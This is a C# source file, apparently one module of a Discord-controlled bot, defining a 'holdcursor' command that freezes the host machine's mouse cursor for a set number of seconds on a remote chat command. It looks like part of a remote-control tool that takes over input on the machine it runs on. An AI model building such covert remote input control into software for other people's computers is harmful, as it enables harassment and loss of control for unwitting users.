using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Commands;
using Timer = System.Timers.Timer;
namespace CSharpSilon.cmds
{
    public class Mouse : ModuleBase<SocketCommandContext>
    {
        [Command("holdcursor"), Alias("hc"),
         Summary("Holds the cursor at its current position for a specified number of seconds")]
        public async Task HoldCursor(int seconds)
        {
            if (seconds <= 0)
            {
                await ReplyAsync("Use A Number Above 0");
                return;
            }

            Point currentCursorPosition = Cursor.Position;
            Timer timer = new Timer
            {
                Interval = 5.0
            };

            DateTime startTime = DateTime.UtcNow;
            timer.Elapsed += (sender, args) =>
            {
                Cursor.Position = currentCursorPosition;
                if ((DateTime.UtcNow - startTime).TotalMilliseconds > seconds * 1000)
                {
                    timer.Stop();
                    timer.Dispose();
                }
            };
            timer.Start();

            await ReplyAsync($"Cursor Will Be Stuck In It's Position For {seconds} Seconds");
        }
    }
}